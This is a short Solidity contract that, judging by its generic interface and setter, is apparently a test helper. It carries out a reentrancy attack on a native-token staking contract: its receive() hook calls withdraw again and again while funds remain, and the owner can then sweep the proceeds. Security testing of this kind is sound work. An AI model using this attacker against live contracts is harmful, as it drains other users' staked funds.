//SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IContract  {
    function stake() external payable;
    function withdraw() external;
    function stakingData(address account) external returns (uint256);
}

contract NativeTokenReentrancyAttack is Ownable {
    address public stakingContract;

    constructor () {}

    function stake() public payable {
        IContract(stakingContract).stake{ value: msg.value }();
    }

    function withdraw() public onlyOwner {
        IContract(stakingContract).withdraw();
    }

    function setStakingContract(address _contract) public onlyOwner {
        stakingContract = _contract;
    }

    function emergencyWithdraw() public onlyOwner {
        _transferNativeToken(msg.sender, address(this).balance);
    }

    function _transferNativeToken(address account, uint256 amount) internal {
        (bool success, ) = account.call{value: amount}("");
        require(success, "TRANSFER_FAILED");
    }

    fallback() external {}

    receive() external payable {
        if (stakingContract.balance >= IContract(stakingContract).stakingData(address(this))) {
            IContract(stakingContract).withdraw();
        }
    }
}